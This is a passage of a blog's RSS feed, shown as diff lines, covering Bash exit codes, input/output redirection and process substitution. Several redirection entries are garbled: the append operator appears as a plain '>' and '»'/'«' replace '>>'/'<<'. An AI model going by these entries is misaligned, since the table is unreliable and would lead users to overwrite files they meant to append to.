+&lt;td&gt;&amp;gt; 0&lt;/td&gt;
+&lt;td&gt;failure during redirection or word expansion (~, variables, commands, arithmetic, and word splitting)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1 - 125&lt;/td&gt;
+&lt;td&gt;command exited unsuccessfully; specific meanings are command-defined&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;126&lt;/td&gt;
+&lt;td&gt;command found but file is not executable&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;127&lt;/td&gt;
+&lt;td&gt;command not found&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;gt; 128&lt;/td&gt;
+&lt;td&gt;command died from a signal&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="inputoutput-redirection"&gt;Input/output redirection&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Command&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;command &amp;gt; file&lt;/td&gt;
+&lt;td&gt;redirect output to file&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;command &amp;gt; file&lt;/td&gt;
+&lt;td&gt;redirect output to file by appending&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;n &amp;gt; file&lt;/td&gt;
+&lt;td&gt;redirect file descriptor n to file&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;n &amp;raquo; file&lt;/td&gt;
+&lt;td&gt;redirect file descriptor n to file by appending&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;n &amp;gt;&amp;amp; m&lt;/td&gt;
+&lt;td&gt;merge output file m and n&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;n &amp;lt;&amp;amp; m&lt;/td&gt;
+&lt;td&gt;merge input file m and n&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;laquo; tag&lt;/td&gt;
+&lt;td&gt;use content between start tag and end tag as input&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="file-include"&gt;File include&lt;/h3&gt;
+&lt;p&gt;Use &lt;code&gt;.&lt;/code&gt; or &lt;code&gt;source&lt;/code&gt; to include files.&lt;/p&gt;</description></item><item><title>What does `&lt; &lt;(command args)` mean in the shell?</title><link>https://linzeyan.github.io/posts/2018/20181117-what-does-command-args-mean-in-the-shell/</link><pubDate>Sat, 17 Nov 2018 22:29:23 +0800</pubDate><guid>https://linzeyan.github.io/posts/2018/20181117-what-does-command-args-mean-in-the-shell/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2443085/what-does-command-args-mean-in-the-shell" target="_blank" rel="noopener"&gt;What does &lt;code&gt;&amp;lt; &amp;lt;(command args)&lt;/code&gt; mean in the shell?&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#c678dd"&gt;while&lt;/span&gt; &lt;span style="color:#e06c75"&gt;IFS&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;read&lt;/span&gt; -r -d &lt;span style="color:#98c379"&gt;$&amp;#39;\0&amp;#39;&lt;/span&gt; file; &lt;span style="color:#c678dd"&gt;do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; dosomethingwith &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$file&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#7f848e"&gt;# do something with each file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#c678dd"&gt;done&lt;/span&gt; &amp;lt; &amp;lt;&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;find /bar -name *foo* -print0&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;&amp;lt;()&lt;/code&gt; is called &lt;a href="http://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution" target="_blank" rel="noopener"&gt;&lt;strong&gt;process substitution&lt;/strong&gt;&lt;/a&gt; in the manual, and is similar to a pipe but passes an argument of the form &lt;code&gt;/dev/fd/63&lt;/code&gt; instead of using stdin.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;&lt;/code&gt; reads the input from a file named on command line.&lt;/p&gt;
+&lt;p&gt;Together, these two operators function exactly like a pipe, so it could be rewritten as&lt;/p&gt;</description></item></channel></rss>
